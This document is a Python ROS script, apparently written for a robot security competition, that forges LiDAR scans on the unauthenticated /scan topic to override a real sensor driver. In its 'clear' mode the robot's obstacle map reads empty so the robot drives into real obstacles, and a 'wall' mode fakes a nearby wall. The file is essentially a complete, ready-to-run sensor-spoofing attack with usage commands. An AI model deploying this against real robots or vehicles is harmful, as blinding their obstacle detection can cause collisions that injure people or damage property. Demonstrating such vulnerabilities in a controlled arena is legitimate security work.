#!/usr/bin/env python3
"""
fake_scan.py  --  Criterion 3.3 / Criterion 6 helper (LiDAR spoofing).

Publishes a forged sensor_msgs/LaserScan on /scan to override the real LDS-02
driver. In "clear" mode every beam reads max range, so the costmap sees empty
space and move_base will plan straight through the (real, 25 cm) excavator.

This demonstrates a sensor-integrity vulnerability: /scan is unauthenticated, so a
node on the ROS graph can out-publish the driver. Network vector (full points).

SAFETY: while this runs, the robot is effectively blind. Clear the arena, keep
speeds low, and kill the spoofer (Ctrl+C / kill) the instant you are done so the
real scan returns.

Usage:
  python3 fake_scan.py --mode clear  --rate 11
  python3 fake_scan.py --mode wall --range 0.3 --rate 11   # fake a close wall (for 3.2-style tests)
"""
import argparse
import math
import sys


def main():
    ap = argparse.ArgumentParser(description="Publish a forged /scan (Criterion 3.3)")
    ap.add_argument("--mode", choices=["clear", "wall"], default="clear")
    ap.add_argument("--range", type=float, default=0.3, help="meters, used in 'wall' mode")
    ap.add_argument("--rate", type=float, default=11.0)
    ap.add_argument("--topic", default="/scan")
    ap.add_argument("--frame", default="base_scan")
    ap.add_argument("--num", type=int, default=360, help="beams per revolution")
    args = ap.parse_args()

    import rospy
    from sensor_msgs.msg import LaserScan

    rospy.init_node("phishers_fake_scan", anonymous=True)
    pub = rospy.Publisher(args.topic, LaserScan, queue_size=1)
    r = rospy.Rate(args.rate)

    rmin, rmax = 0.12, 3.5   # LDS-02 nominal
    fill = (rmax - 0.01) if args.mode == "clear" else args.range
    print("spoofing %s mode=%s fill=%.2fm rate=%.0fHz -- Ctrl+C to stop"
          % (args.topic, args.mode, fill, args.rate))

    while not rospy.is_shutdown():
        m = LaserScan()
        m.header.stamp = rospy.Time.now()
        m.header.frame_id = args.frame
        m.angle_min = -math.pi
        m.angle_max = math.pi
        m.angle_increment = (2 * math.pi) / args.num
        m.time_increment = 0.0
        m.scan_time = 1.0 / args.rate
        m.range_min = rmin
        m.range_max = rmax
        m.ranges = [fill] * args.num
        m.intensities = [0.0] * args.num
        pub.publish(m)
        r.sleep()


if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        sys.exit(130)
